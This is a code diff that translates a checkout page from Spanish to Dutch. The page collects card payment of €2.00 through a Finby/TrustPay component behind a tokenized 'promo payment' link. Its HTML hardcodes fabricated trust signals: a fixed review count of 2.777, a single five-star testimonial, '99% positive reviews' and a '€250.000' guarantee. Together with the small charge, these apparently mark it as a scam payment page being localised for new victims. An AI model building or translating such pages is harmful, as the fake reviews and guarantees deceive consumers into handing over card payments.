@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="nl">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Pago Seguro</title>
+<title>Veilige Betaling</title>
 
 <meta name="referrer" content="no-referrer">
 
@@ -216,29 +216,29 @@ animation:loadingBar 2.2s ease-in-out infinite;
 
 <body>
 
-<div class="safe">Pago Seguro SSL</div>
+<div class="safe">Beveiligde SSL-verbinding</div>
 
 <div class="wrap">
 
 <div class="page-title">
-Pago Seguro 🔒 <span class="stars">★★★★★</span>
-<span class="reviews">(2,777 reseñas)</span>
+Veilige Betaling 🔒 <span class="stars">★★★★★</span>
+<span class="reviews">(2.777 beoordelingen)</span>
 </div>
 
 <div class="grid">
 
 <div class="card">
 
-<div class="h2">2. Pago</div>
-<p class="sub">La información de la tarjeta está encriptada y se procesa de forma segura.</p>
+<div class="h2">2. Betaling</div>
+<p class="sub">Kaartgegevens worden versleuteld en veilig verwerkt.</p>
 
 <div id="card-element"></div>
 
 <div id="err" class="err" aria-hidden="true"></div>
 
 <div style="display:flex;gap:10px;margin-top:12px">
-<button id="backBtn" class="btn" style="width:40%">Atrás</button>
-<button id="payNow" class="btn" style="width:60%">Pagar de Forma Segura Ahora</button>
+<button id="backBtn" class="btn" style="width:40%">Terug</button>
+<button id="payNow" class="btn" style="width:60%">Nu Veilig Betalen</button>
 </div>
 
 </div>
@@ -254,31 +254,31 @@ style="font-weight:900;font-size:18px"></div>
 </div>
 
 <div class="widget">
-<div style="text-align:center;font-weight:800">Reseñas de Clientes</div>
+<div style="text-align:center;font-weight:800">Klantbeoordelingen</div>
 <div style="text-align:center;font-weight:700;">Fenella Lara</div>
 <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-<p style="text-align:center">Recibí mi producto ayer. ¡Excelente experiencia!</p>
+<p style="text-align:center">Ik heb mijn product gisteren ontvangen. Geweldige ervaring!</p>
 </div>
 
 <div class="widget">
 <div class="delivery">
 <div>
-<div style="font-weight:800">Entrega Rápida</div>
-<div class="sub">3–5 días laborables</div>
+<div style="font-weight:800">Snelle Levering</div>
+<div class="sub">3–5 werkdagen</div>
 </div>
 <div style="margin-left:auto;font-weight:800">Gratis</div>
 </div>
 
-<div style="margin-top:14px;font-weight:800">Resumen del Pedido</div>
-<div class="order-row"><span>Total</span><span>2,00 €</span></div>
+<div style="margin-top:14px;font-weight:800">Bestelling Overzicht</div>
+<div class="order-row"><span>Totaal</span><span>€2,00</span></div>
 </div>
 
 <div class="widget">
-<div style="font-weight:800;margin-bottom:10px">Por Qué Confiar en Nosotros</div>
+<div style="font-weight:800;margin-bottom:10px">Waarom Kiezen Voor Ons</div>
 <div class="trust">
-<div class="box"><div>⭐</div><div>99% de reseñas positivas</div></div>
-<div class="box"><div>🔒</div><div>Seguridad SSL</div></div>
-<div class="box"><div>🛡️</div><div>Garantía de 250.000 €</div></div>
+<div class="box"><div>⭐</div><div>99% positieve reviews</div></div>
+<div class="box"><div>🔒</div><div>SSL Beveiligd</div></div>
+<div class="box"><div>🛡️</div><div>€250.000 Verzekering</div></div>
 </div>
 </div>
 
@@ -289,9 +289,9 @@ style="font-weight:900;font-size:18px"></div>
 
 <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
 <div class="loading-box">
-<div class="loading-title">Procesando pago…</div>
+<div class="loading-title">Uw betaling wordt verwerkt…</div>
 <div class="progress-wrap"><div class="progress-bar"></div></div>
-<p class="sub" style="margin-top:10px">Por favor espere unos segundos…</p>
+<p class="sub" style="margin-top:10px">Een moment geduld alstublieft…</p>
 </div>
 </div>
 
@@ -360,13 +360,13 @@ async function safeJson(response) {
     try {
         return JSON.parse(text);
     } catch (e) {
-        throw new Error(text || "El servidor devolvió una respuesta inválida.");
+        throw new Error(text || "Server heeft een ongeldig antwoord teruggestuurd.");
     }
 }
 
 async function initialiseFinby() {
     if (!tokenFromServer) {
-        throw new Error("Enlace de pago inválido o caducado.");
+        throw new Error("Ongeldige of verlopen betalingslink.");
     }
 
     const response = await fetch("/api/create-promo-payment", {
@@ -382,11 +382,11 @@ async function initialiseFinby() {
     const data = await safeJson(response);
 
     if (!response.ok) {
-        throw new Error(data.error || "No se pudo crear el pago.");
+        throw new Error(data.error || "Kon betaling niet aanmaken.");
     }
 
     if (!data.secrets || !data.secrets.payment) {
-        throw new Error("Falló la configuración del pago. No se devolvió la clave secreta de pago.");
+        throw new Error("Instellen van betaling mislukt. Geen betalingsgeheim ontvangen.");
     }
 
     paymentSecrets = data.secrets;
@@ -411,7 +411,7 @@ window.addEventListener("load", async () => {
         payNow.disabled = false;
     } catch (e) {
         console.error(e);
-        showError(e.message || "No se pudo cargar el formulario de pago.");
+        showError(e.message || "Kon het betalingsformulier niet laden.");
         payNow.disabled = true;
     }
 });
@@ -431,7 +431,7 @@ setTimeout(() => {
 
     try {
         if (!trustPayApi || !cardComponent || !paymentSecrets) {
-            throw new Error("El formulario de pago no está cargado.");
+            throw new Error("Betalingsformulier niet geladen.");
         }
 
         const result = await trustPayApi.finishCardPayment(paymentSecrets.payment, {
@@ -453,7 +453,7 @@ setTimeout(() => {
     );
 
 if (!isFinbySuccess) {
-    throw new Error("El pago no se completó.");
+    throw new Error("Betaling is niet voltooid.");
 }
 
 const qs = new URLSearchParams(location.search);
@@ -470,12 +470,12 @@ window.location.href =
 
 return;
 
-        throw new Error("El pago no se completó. Por favor verifique los detalles de su tarjeta.");
+        throw new Error("Betaling is niet voltooid. Controleer uw kaartgegevens.");
 
     } catch (e) {
         console.error(e);
         overlay.setAttribute("aria-hidden", "true");
-        showError(e.message || "Pago fallido.");
+        showError(e.message || "Betaling mislukt.");
         payNow.disabled = false;
     }
 };
